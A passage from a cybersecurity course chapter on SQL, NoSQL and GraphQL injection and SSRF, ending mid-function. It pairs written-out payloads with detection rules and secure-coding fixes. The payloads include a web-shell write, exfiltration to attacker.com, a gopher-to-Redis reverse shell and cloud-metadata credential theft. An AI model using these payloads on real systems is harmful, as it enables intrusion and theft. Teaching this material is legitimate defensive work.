---
corso: "Cybersecurity Masterclass"
fase: "Domain 8 — Web Security"
modulo: "8.B"
titolo: "Server-Side Attacks and API Security"
versione: "OWASP Top 10:2025, OWASP API Security Top 10:2023, CWE/SANS Top 25 (2024), ModSecurity CRS 4.x, sqlmap 1.8+"
livello: "Advanced"
prerequisiti:
  - "Domain 8 Chapter 8A (client-side attacks, OAuth 2.0, JWT fundamentals, CORS/CSP)"
  - "HTTP fundamentals (request/response lifecycle, methods, headers, status codes, cookies)"
  - "Relational database fundamentals (SQL syntax, JOINs, schema, parameterized queries)"
  - "Linux command-line proficiency (shell, networking tools, process management)"
  - "Basic Python or Node.js for scripting exploit payloads and automation"
obiettivi:
  - "Discover, classify, and exploit all SQL injection variants (union, error, boolean-blind, time-blind, stacked, OOB, second-order) across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite using sqlmap and manual techniques, then deploy parameterized queries and database hardening as remediation"
  - "Exploit SSRF vulnerabilities to access cloud metadata services (AWS IMDSv1/v2, GCP, Azure), internal APIs, and non-HTTP services via protocol smuggling (gopher, dict, file), then implement allowlist-based URL validation with DNS-pinning defenses"
  - "Identify and exploit insecure deserialization in Java (ysoserial), Python (pickle), PHP (PHPGGC), .NET (ysoserial.net), and Node.js (node-serialize) to achieve remote code execution, then apply language-specific mitigations (ObjectInputFilter, JSON-only parsing, BinaryFormatter deprecation)"
  - "Detect and exploit server-side template injection across Jinja2, Twig, Freemarker, Velocity, ERB, and Pug using polyglot probes and engine-specific RCE payloads, then enforce template sandboxing and data-only variable passing as defenses"
  - "Enumerate and exploit API vulnerabilities including BOLA/IDOR, mass assignment, GraphQL introspection abuse, batching brute-force, and WebSocket hijacking using Burp Suite, ffuf, and nuclei, then implement resolver-level authorization, query complexity analysis, and webhook signature verification"
tag: [security, web, server-side, sql-injection, nosql-injection, ssrf, ssti, deserialization, xxe, api-security, graphql, grpc, websocket, command-injection, request-smuggling, cache-poisoning, rate-limiting, owasp]
---

# Domain 8, Chapter 8B — Server-Side Attacks and API Security

> **Learning objectives.** After completing this chapter you will be able to: (1) exploit and remediate all SQL injection variant classes across five major RDBMS engines using both automated tools and manual techniques; (2) chain SSRF through cloud metadata, internal services, and protocol smuggling to demonstrate full credential theft, then apply defense-in-depth mitigations at application and infrastructure layers; (3) craft and deliver deserialization payloads for Java, Python, PHP, .NET, and Node.js runtimes, then implement language-appropriate serialization defenses; (4) detect template engine type via polyglot probes and escalate SSTI to RCE across six template engines, then enforce sandboxed template rendering; (5) perform end-to-end API security assessments covering BOLA, mass assignment, GraphQL abuse, HTTP request smuggling, and cache poisoning, then deploy rate limiting, authorization controls, and detection engineering signatures.

> **Scope.** SQL injection (union, error, boolean blind, time blind, stacked, OOB, second-order). NoSQL injection (MongoDB operators, aggregation pipeline). GraphQL injection (introspection, batching, alias brute-force, recursive fragments). SSRF (internal scanning, cloud metadata, gopher, blind). SSTI (Jinja2, Twig, Freemarker, Velocity, ERB, Pug). Deserialization (Java, .NET, Python, PHP, Ruby, Node.js). XXE (internal/external DTD, parameter entities, blind OOB). LDAP/XPath/SMTP/CRLF injection. HTTP request smuggling (CL.TE, TE.CL, TE.TE, H2.CL, H2.TE). Host header attacks. Cache poisoning and web cache deception. Open redirect and OAuth token theft. REST API vulnerabilities (mass assignment, IDOR, BOLA, BFLA). GraphQL security (depth limiting, cost analysis, persisted queries). gRPC security. WebSocket security. Webhook security.

---

## 1. SQL injection

### 1.1 Variants

**Union-based.** The attacker appends a `UNION SELECT` to the original query, combining the legitimate result set with data from other tables. Requires the attacker to match the column count and data types of the original query. Used for direct data extraction.

**Error-based.** The attacker injects syntax that causes the database to include sensitive data in error messages (e.g., `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))` on MySQL; `CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))` on MSSQL). Useful when the application displays database errors.

**Boolean-based blind.** The application shows different behavior (different page content, HTTP status, or response length) for true vs false SQL conditions. The attacker asks yes/no questions: `AND SUBSTRING(password, 1, 1) = 'a'`. Each character requires up to 128 requests (binary search on the ASCII value).

**Time-based blind.** The application shows no visible difference for true/false, but the attacker can inject conditional time delays: `AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0)`. A 5-second response delay means "true." Slower than boolean-based but works when the application's response is completely uniform.

**Stacked queries.** Some database drivers (notably MSSQL and PostgreSQL via libpq) allow multiple statements separated by semicolons: `; DROP TABLE users; --`. This enables arbitrary SQL execution beyond just `SELECT`. MySQL's standard connector doesn't support stacked queries (mitigating this variant).

**Out-of-band (OOB) exfiltration.** The attacker causes the database server to make external connections (DNS lookup, HTTP request) containing exfiltrated data. On MSSQL: `exec master..xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users) + '.txt'`. On Oracle: `UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM users WHERE rownum=1))`. Works when the application shows no output at all (fully blind).

**Second-order.** The payload is stored in the database (via a safe parameterized insert) but later used in a different, vulnerable query without sanitization. Example: a username containing `admin'--` is stored safely, but a password-change function concatenates the stored username into a query: `UPDATE users SET password='new' WHERE username='admin'--'`.

### 1.2 Enumeration and discovery

Identifying injection points before exploitation:

```bash
# sqlmap — basic detection on a GET parameter
sqlmap -u "https://target.com/search?q=test" --batch --level=3 --risk=2

# sqlmap — POST parameter with cookie auth
sqlmap -u "https://target.com/api/search" --data="query=test&category=1" \
  --cookie="session=abc123" --batch --dbs

# sqlmap — from Burp saved request
sqlmap -r request.txt --batch --dbs

# Manual detection payloads (inject each and observe differences)
# String context:  ' OR '1'='1   /   ' AND '1'='2
# Numeric context: 1 OR 1=1     /   1 AND 1=2
# Time-based:      1; WAITFOR DELAY '0:0:5'--  (MSSQL)
#                  1 AND SLEEP(5)               (MySQL)
#                  1; SELECT pg_sleep(5)--      (PostgreSQL)

# Column count enumeration for UNION attacks
' ORDER BY 1--
' ORDER BY 2--
# ... increment until error → column count = last successful number

# Confirm injectable columns that reflect output
' UNION SELECT NULL,NULL,NULL--          # match column count
' UNION SELECT 'a',NULL,NULL--           # find string-reflecting column
```

**sqlmap advanced techniques:**
```bash
# Specific technique selection
sqlmap -u "https://target.com/item?id=1" --technique=BEU --batch

# OOB exfiltration via DNS
sqlmap -u "https://target.com/item?id=1" --dns-domain=sqli.attacker.com

# OS shell through SQL injection (requires DBA privileges)
sqlmap -u "https://target.com/item?id=1" --os-shell

# File read/write (MySQL FILE privilege, MSSQL xp_cmdshell)
sqlmap -u "https://target.com/item?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/item?id=1" --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"

# WAF bypass with tamper scripts
sqlmap -u "https://target.com/item?id=1" \
  --tamper=space2comment,between,randomcase,charencode --batch

# Second-order injection
sqlmap -u "https://target.com/register" --data="username=test&password=pass" \
  --second-url="https://target.com/profile" --batch
```

| Tamper Script | Purpose | Bypass Target |
|---|---|---|
| `space2comment` | Replace spaces with `/**/` | Simple space filters |
| `between` | Replace `>` with `NOT BETWEEN 0 AND` | Comparison operator filters |
| `charencode` | URL-encode characters | WAF character blacklists |
| `randomcase` | Randomize keyword case | Case-sensitive keyword filters |
| `equaltolike` | Replace `=` with `LIKE` | Equality operator filters |
| `apostrophemask` | UTF-8 encode `'` | Quote filters |
| `space2mssqlblank` | Replace space with MSSQL whitespace chars | MSSQL-specific WAFs |
| `percentage` | Add `%` between keyword chars | IDS/IPS evasion |

### 1.3 WAF bypass techniques

Manual bypass payloads when WAFs block standard SQLi syntax:

```sql
-- Case manipulation
uNiOn SeLeCt 1,2,3--

-- Inline comments (MySQL-specific)
UN/**/ION SEL/**/ECT 1,2,3--
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
-- The /*!50000 ... */ syntax executes only on MySQL >= 5.00.00

-- Hex encoding
SELECT 0x61646d696e  -- hex for 'admin'
UNION SELECT UNHEX('61646D696E')--

-- Unicode normalization bypass
# In applications that normalize Unicode before DB query but WAF checks pre-normalization:
＇ OR ＇1＇=＇1  -- fullwidth apostrophes (U+FF07)

-- Double URL encoding (when WAF decodes once, app decodes twice)
%2527 OR %25271%2527=%25271  -- %25 = %, so %2527 = %27 = '

-- Whitespace alternatives
UNION%09SELECT%0A1,2,3--     -- tab, newline instead of space
UNION(SELECT(1),(2),(3))--   -- parentheses as delimiters

-- String concatenation instead of keywords
CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)  -- MySQL
CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116)  -- Oracle/PostgreSQL

-- Scientific notation for numeric bypass
0e1UNION SELECT 1,2,3--

-- NULL byte injection (legacy WAFs)
%00' UNION SELECT 1,2,3--

-- HTTP parameter pollution (HPP)
# If WAF checks first param but app uses last:
?id=1&id=' UNION SELECT 1,2,3--

-- JSON-based injection (MySQL 5.7+)
' UNION SELECT 1, JSON_EXTRACT('{"a":"data"}','$.a'),3--

-- MSSQL specific bypasses
EXEC('SEL' + 'ECT 1')
DECLARE @q VARCHAR(100)='SELECT 1'; EXEC(@q)
```

### 1.4 Database-specific exploitation chains

**MySQL — UDF command execution:**
```sql
-- Check privileges
SELECT user, host, super_priv FROM mysql.user WHERE user = current_user();
-- Load UDF library (requires FILE and INSERT privilege)
SELECT UNHEX('...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exec.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_exec.so';
SELECT sys_exec('id > /tmp/output.txt');
```

**MSSQL — xp_cmdshell and linked servers:**
```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY(LINKEDSRV, 'SELECT @@version');
-- Execute on linked server (double-hop)
EXEC ('EXEC master..xp_cmdshell ''whoami''') AT [LINKEDSRV];

-- NTLM hash theft via UNC path
EXEC master..xp_dirtree '\\attacker.com\share';
-- Capture with Responder: responder -I eth0
```

**PostgreSQL — command execution:**
```sql
-- Copy-to/from-program (superuser)
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';

-- Large object functions
SELECT lo_import('/etc/passwd');
SELECT lo_get(loid) FROM pg_largeobject_metadata;

-- PLpgSQL command execution
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
  import os; return os.popen(args[0]).read()
$$ LANGUAGE plpythonu;
SELECT cmd('id');
```

**SQLite — data extraction and file system access:**
```sql
-- Version detection
SELECT sqlite_version();

-- Table enumeration (sqlite_master instead of information_schema)
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';

-- Boolean-based blind (no SLEEP function — use heavy query for time-based)
AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a')
     THEN 1 ELSE LOAD_EXTENSION('x') END)

-- Time-based blind via heavy computation (no native sleep)
AND 1=CASE WHEN (SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a')
     THEN (SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b,
           sqlite_master AS c, sqlite_master AS d) ELSE 0 END

-- Attach database for file write (requires ATTACH privilege)
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.exploit (code TEXT);
INSERT INTO pwn.exploit VALUES ('<?php system($_GET["cmd"]); ?>');

-- Union-based extraction (SQLite uses || for concatenation)
' UNION SELECT 1, group_concat(name, '|') FROM sqlite_master WHERE type='table'--
' UNION SELECT 1, group_concat(sql, char(10)) FROM sqlite_master--

-- LIKE-based blind (case-insensitive by default in SQLite)
AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1) GLOB 'a*'
```

**Oracle — privilege escalation:**
```sql
-- Java command execution (requires CREATE PROCEDURE + Java permission)
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "CMD" AS
  import java.io.*; public class CMD {
    public static String exec(String cmd) throws Exception {
      return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
    }
  };
/
CREATE OR REPLACE FUNCTION os_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
  AS LANGUAGE JAVA NAME 'CMD.exec(java.lang.String) return java.lang.String';
/
SELECT os_cmd('id') FROM dual;
```

### 1.5 Detection

**Sigma rule — SQL injection in web logs:**
```yaml
title: SQL Injection Attempt in Web Application Logs
id: 8c3e2e1a-5f0d-4b2e-9c1a-3d4e5f6a7b8c
status: stable
logsource:
  category: webserver
  product: apache  # or nginx, iis
detection:
  selection_keywords:
    cs-uri-query|contains:
      - 'UNION SELECT'
      - 'UNION ALL SELECT'
      - "' OR '1'='1"
      - "' OR 1=1--"
      - 'WAITFOR DELAY'
      - 'pg_sleep'
      - 'SLEEP('
      - 'BENCHMARK('
      - 'extractvalue('
      - 'updatexml('
      - 'xp_cmdshell'
      - 'sp_configure'
      - 'INTO OUTFILE'
      - 'INTO DUMPFILE'
      - 'LOAD_FILE('
  selection_body:
    cs-body|contains:
      - 'UNION SELECT'
      - "'; DROP"
      - '1=1--'
  condition: selection_keywords or selection_body
  level: high
  tags:
    - attack.initial_access
    - attack.t1190
```

**ModSecurity CRS rules (key rule IDs):**

| Rule ID | Description | Attack Type |
|---|---|---|
| 942100 | SQL injection detected via libinjection | Generic SQLi |
| 942110 | SQL injection attack: common testing | Probing |
| 942120 | SQL injection using operator | Operator-based |
| 942150 | SQL injection attack | UNION-based |
| 942160 | Blind SQL injection test with sleep() | Time-based |
| 942170 | SQL injection attempt with benchmark/sleep | Time-based |
| 942190 | MSSQL code execution and info gathering | xp_cmdshell |
| 942200 | MySQL comment/space obfuscation | Evasion |
| 942260 | SQL auth bypass attempt (2/3) | Login bypass |
| 942340 | SQL injection attempt (conditional) | Boolean-based |
| 942370 | Classic SQL injection probing | Error-based |

**Suricata rule — SQL injection in HTTP traffic:**
```
alert http any any -> $HOME_NET any (msg:"ET WEB_SERVER SQL Injection UNION SELECT"; \
  flow:established,to_server; \
  http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; \
  classtype:web-application-attack; sid:2100001; rev:1;)

alert http any any -> $HOME_NET any (msg:"ET WEB_SERVER SQL Injection Time-Based Blind"; \
  flow:established,to_server; \
  http.uri; content:"SLEEP("; nocase; \
  classtype:web-application-attack; sid:2100002; rev:1;)
```

### 1.6 Defense

Parameterized queries (prepared statements) are the definitive defense. The SQL structure is compiled separately from the data; user input is never interpreted as SQL syntax.

**Secure patterns per language:**
```python
# Python — parameterized (SAFE)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Python — f-string interpolation (VULNERABLE)
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

```java
// Java — PreparedStatement (SAFE)
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

// Java — string concatenation (VULNERABLE)
Statement s = conn.createStatement();
s.executeQuery("SELECT * FROM users WHERE id = " + userId);
```

```javascript
// Node.js pg — parameterized (SAFE)
const result = await pool.query('SELECT * FROM users WHERE id = $1', [userId]);

// Node.js — string template (VULNERABLE)
const result = await pool.query(`SELECT * FROM users WHERE id = ${userId}`);
```

```php
// PHP — PDO prepared statement (SAFE)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);

// PHP — mysqli prepared statement (SAFE)
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $userId);
$stmt->execute();

// PHP — string interpolation (VULNERABLE)
$result = $mysqli->query("SELECT * FROM users WHERE id = $userId");

// PHP — addslashes is NOT sufficient defense
$result = $mysqli->query("SELECT * FROM users WHERE id = '" . addslashes($userId) . "'");
// GBK/SJIS charset bypass: 0xbf27 passes addslashes but becomes valid quote in multibyte
```

```csharp
// C# — SqlParameter (SAFE)
var cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", conn);
cmd.Parameters.AddWithValue("@id", userId);

// C# — concatenation (VULNERABLE)
var cmd = new SqlCommand("SELECT * FROM users WHERE id = " + userId, conn);
```

**ORM pitfalls — still vulnerable patterns:**
```python
# SQLAlchemy raw SQL (VULNERABLE)
session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# SQLAlchemy parameterized raw (SAFE)
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})

# Django ORM — extra() with raw SQL (VULNERABLE)
User.objects.extra(where=[f"username = '{name}'"])

# Django ORM — filter (SAFE)
User.objects.filter(username=name)
```

**Database hardening:**
```sql
-- MySQL: restrict FILE and PROCESS privileges
REVOKE FILE ON *.* FROM 'webapp'@'%';
REVOKE PROCESS ON *.* FROM 'webapp'@'%';
REVOKE SUPER ON *.* FROM 'webapp'@'%';

-- PostgreSQL: revoke dangerous extensions
REVOKE EXECUTE ON FUNCTION pg_read_file(text) FROM PUBLIC;
ALTER USER webapp SET session_preload_libraries = '';

-- MSSQL: disable xp_cmdshell and restrict linked servers
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
```

### 1.7 Incident response

1. **Identify scope** — query WAF/web logs for SQLi patterns; correlate source IPs with session tokens
2. **Determine exfiltration** — check for UNION SELECT with sensitive table names, OOB DNS queries, large response sizes
3. **Assess database impact** — review database audit logs for unauthorized reads, schema changes, new accounts, UDF creation
4. **Rotate credentials** — if database credentials were potentially extracted, rotate all DB passwords and application secrets
5. **Patch the vulnerability** — deploy parameterized queries for the affected endpoint
6. **Notify** — if PII was exfiltrated, trigger breach notification procedures per applicable regulations

---

## 2. NoSQL injection

### 2.1 MongoDB operator injection

MongoDB and similar document databases replace SQL syntax with operator-based queries but remain injectable when user input is incorporated into query objects without sanitization.

**Operator injection.** If the application builds a MongoDB query from user input as a JSON object (`{username: req.body.username, password: req.body.password}`), the attacker can submit `password[$ne]=x` (via query-string parameter parsing in Express.js), which becomes `{password: {$ne: "x"}}` — matching any password that is not "x" (authentication bypass).

**Exploitation step-by-step:**
```bash
# Authentication bypass via operator injection
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# Alternative via URL encoding (Express.js qs parser)
curl "https://target.com/login?username=admin&password[$ne]=invalid"

# Extract password character-by-character using $regex
curl -X POST https://target.com/login \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# Response differs for match vs no-match → iterate characters

# Data extraction with $gt/$lt (binary search on string values)
curl -X POST https://target.com/api/users \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# Enumerate all usernames
curl -X POST https://target.com/api/users \
  -d '{"username":{"$regex":".*"}}'
```

**`$where` injection.** The `$where` operator evaluates a JavaScript expression:
```bash
# JavaScript injection via $where
curl -X POST https://target.com/api/search \
  -d '{"$where":"this.username == '\''admin'\'' && sleep(5000)"}'

# Data exfiltration via $where with tojson()
curl -X POST https://target.com/api/search \
  -d '{"$where":"this.password.match(/^a/) ? true : sleep(5000)"}'
```

**Aggregation pipeline injection:**
```bash
# Inject additional pipeline stages
curl -X POST https://target.com/api/aggregate \
  -H "Content-Type: application/json" \
  -d '[{"$match":{"status":"active"}},{"$lookup":{"from":"users","localField":"userId","foreignField":"_id","as":"userData"}}]'
```

### 2.2 Other NoSQL databases

| Database | Injection Vector | Example |
|---|---|---|
| CouchDB | REST API manipulation | `GET /db/_all_docs?include_docs=true` |
| Redis | Command injection via CRLF in keys | `SET key "value\r\nCONFIG SET dir /tmp"` |
| Elasticsearch | Query DSL injection | `{"query":{"match_all":{}}}` in search param |
| Cassandra | CQL injection (similar to SQL) | `' OR token(id)>0--` |

### 2.3 Detection and defense

**Sigma rule — NoSQL injection:**
```yaml
title: NoSQL Injection Attempt via HTTP Parameters
id: 9d4f3e2b-6a1c-4d3e-8b2a-1c5d6e7f8a9b
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - '[$ne]'
      - '[$gt]'
      - '[$lt]'
      - '[$regex]'
      - '[$where]'
      - '[$exists]'
      - '$or'
      - '$and'
      - '$not'
  condition: selection
  level: high
```

**Defense:**
```javascript
// Express.js — disable qs nested parsing (prevents operator injection)
app.use(express.urlencoded({ extended: false }));

// Mongoose — schema validation prevents operator injection
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});

// Express middleware — strip MongoDB operators from input
function sanitizeMongo(req, res, next) {
  const sanitize = (obj) => {
    for (const key in obj) {
      if (key.startsWith('$')) delete obj[key];
      else if (typeof obj[key] === 'object') sanitize(obj[key]);
    }
  };
  sanitize(req.body);
  sanitize(req.query);
  next();
}

// Or use mongo-sanitize package
const sanitize = require('mongo-sanitize');
app.use((req, res, next) => {
  req.body = sanitize(req.body);
  req.query = sanitize(req.query);
  next();
});
```

---

## 3. GraphQL security

### 3.1 Introspection abuse

GraphQL's introspection system (`__schema`, `__type`) reveals the entire API schema:

```bash
# Full schema introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}"}'

# InQL Burp extension or CLI for automated introspection
inql -t https://target.com/graphql -o schema_dump/

# graphw00f — fingerprint GraphQL engine
graphw00f -t https://target.com/graphql

# clairvoyance — schema discovery when introspection is disabled
# Uses field suggestion errors to reconstruct schema
clairvoyance https://target.com/graphql -o schema.json
```

### 3.2 Batching and alias-based brute-force

```graphql
# Alias-based credential brute-force — single HTTP request, 1000 login attempts
{
  a0: login(username: "admin", password: "password1") { token }
  a1: login(username: "admin", password: "password2") { token }
  a2: login(username: "admin", password: "password3") { token }
  # ... up to thousands of aliases
}

# Array-based batching
[
  {"query":"mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query":"mutation { login(user:\"admin\", pass:\"pass2\") { token } }"}
]
```

### 3.3 Recursive fragment DoS (query complexity attack)

```graphql
# Deeply nested query — exponential resolver execution
{
  users {
    friends {
      friends {
        friends {
          friends {
            friends { id name }
          }
        }
      }
    }
  }
}

# Circular fragment reference
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
query { user(id: 1) { ...A } }
```

### 3.4 Other GraphQL attacks

**SQL injection through GraphQL arguments:**
```graphql
mutation {
  updateUser(id: 1, name: "admin' OR '1'='1") { id }
}
```

**Authorization bypass via direct nested query:**
```graphql
# The `users` root query requires admin, but accessing users through
# an unrestricted relationship bypasses the check
{
  publicPost(id: 1) {
    author {
      email        # PII leak
      creditCards { # financial data
        number
        cvv
      }
    }
  }
}
```

### 3.5 Defense

```javascript
// Apollo Server — disable introspection and enforce query complexity
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false,
  validationRules: [
    depthLimit(7),
    costAnalysis({ maximumCost: 1000 }),
  ],
  plugins: [
    {
      requestDidStart() {
        return {
          didResolveOperation({ request }) {
            // Rate limit by operation count, not HTTP request count
            const operationCount = countAliases(request.query);
            if (operationCount > 10) throw new Error('Too many aliases');
          }
        };
      }
    }
  ]
});

// Persisted queries — only accept pre-registered query hashes
const server = new ApolloServer({
  persistedQueries: {
    cache: new InMemoryLRUCache({ maxSize: 1000 }),
  }
});
```

---

## 4. SSRF (Server-Side Request Forgery)

### 4.1 Mechanism and targets

The attacker induces the server to make an HTTP (or other protocol) request to an attacker-chosen URL. If the server is inside a private network, the attacker can reach internal services not directly accessible from the internet.

### 4.2 Cloud metadata exploitation

**AWS IMDSv1 (no additional headers required):**
```bash
# Retrieve IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary credentials for the role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name
# Returns: AccessKeyId, SecretAccessKey, Token

# Retrieve user data (may contain bootstrap scripts with secrets)
curl http://169.254.169.254/latest/user-data

# EC2 instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS IMDSv2 (requires PUT + token header — blocks most SSRF):**
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

**GCP metadata:**
```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Access token for GCP APIs
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure IMDS:**
```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

| Cloud | Metadata Endpoint | Required Header | SSRF Protection |
|---|---|---|---|
| AWS IMDSv1 | `169.254.169.254/latest/` | None | None (deprecated) |
| AWS IMDSv2 | `169.254.169.254/latest/` | `X-aws-ec2-metadata-token` (PUT) | PUT required for token |
| GCP | `metadata.google.internal` | `Metadata-Flavor: Google` | Header check |
| Azure | `169.254.169.254/metadata/` | `Metadata: true` | Header check |
| DigitalOcean | `169.254.169.254/metadata/` | None | None |
| Alibaba | `100.100.100.200/latest/` | None | None |

### 4.3 SSRF bypass techniques

```bash
# IP address encoding bypasses
http://127.0.0.1       → http://0x7f000001        # hex
http://127.0.0.1       → http://2130706433        # decimal
http://127.0.0.1       → http://0177.0.0.1        # octal
http://127.0.0.1       → http://127.1             # shorthand
http://127.0.0.1       → http://[::1]             # IPv6 loopback
http://127.0.0.1       → http://0                 # zero = loopback on many OS
http://127.0.0.1       → http://127.0.0.1.nip.io  # DNS wildcard service

# DNS rebinding
# Step 1: Register domain attacker.com with TTL=0
# Step 2: First resolution → attacker's IP (passes validation)
# Step 3: Second resolution → 169.254.169.254 (actual SSRF target)
# Tool: singularity (https://github.com/nccgroup/singularity)

# Protocol smuggling via gopher
gopher://127.0.0.1:6379/_SET%20exploit%20%22%0d%0a%2a1%0d%0a%244%0d%0aSAVE%0d%0a%22

# Protocol smuggling via dict (probe internal services)
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats  # Memcached

# Protocol smuggling via file (local file read)
file:///etc/passwd
file:///proc/self/environ    # environment variables with secrets
file:///proc/self/cmdline    # process command line
file:///home/user/.ssh/id_rsa

# Protocol smuggling via jar (Java-specific, triggers HTTP then file read)
jar:http://attacker.com/evil.jar!/payload.class
# Java downloads the JAR, extracts the file — useful for bypassing file:// restrictions

# Redirect chain bypass — server follows HTTP redirects
# Host a page at attacker.com that 302-redirects to http://169.254.169.254/...
# Bypasses allowlist checks that only validate the initial URL

# Blind SSRF detection via DNS/HTTP pingback
# Using Burp Collaborator:
# 1. Generate Collaborator payload: xyz123.burpcollaborator.net
# 2. Inject as URL: http://xyz123.burpcollaborator.net/test
# 3. Monitor Collaborator for DNS/HTTP callbacks
# Alternative free tools: interactsh, webhook.site, dnslog.cn

# interactsh for OOB detection
interactsh-client -n attacker
# Inject: http://<interactsh-id>.oast.pro

# SSRF via URL parser confusion
# Python urllib vs browser URL parsing differences
http://attacker.com#@internal.server/admin
http://internal.server\@attacker.com
http://attacker.com%00@internal.server
```

### 4.4 Exploitation chains

**SSRF → Redis → RCE:**
```bash
# Generate gopher payload for Redis (write crontab)
# Using Gopherus tool:
gopherus --exploit redis

# Manual gopher payload for Redis reverse shell via cron
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**SSRF → Kubernetes API:**
```bash
# Access K8s API from a pod via SSRF
http://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/secrets
# Uses the pod's service account token mounted at
# /var/run/secrets/kubernetes.io/serviceaccount/token

# Access kubelet API (if anonymous auth enabled)
http://NODE_IP:10250/pods
http://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER
```

### 4.5 Detection

**Sigma rule — SSRF to cloud metadata:**
```yaml
title: SSRF Attempt to Cloud Metadata Endpoint
id: 7e3f2d1c-8b4a-5e6f-9c0d-2a3b4c5d6e7f
status: stable
logsource:
  category: proxy
detection:
  selection_aws:
    url|contains: '169.254.169.254'
  selection_gcp:
    url|contains: 'metadata.google.internal'
  selection_azure:
    url|contains: '169.254.169.254/metadata'
  selection_internal:
    url|re: 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)'
  condition: selection_aws or selection_gcp or selection_azure or selection_internal
  level: critical
  tags:
    - attack.t1552.005
```

**Application-level logging:**
```python
# Log all outbound requests for SSRF detection
import logging
import requests

original_request = requests.Session.request
def logged_request(self, method, url, **kwargs):
    logging.warning(f"OUTBOUND_REQUEST: {method} {url} caller={inspect.stack()[1]}")
    return original_request(self, method, url, **kwargs)
requests.Session.request = logged_request
```

### 4.6 Defense

```python
# Python — SSRF prevention with URL validation
import ipaddress
from urllib.parse import urlparse

BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # link-local / metadata
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('::1/128'),
]

def validate_url(url: str) -> bool:
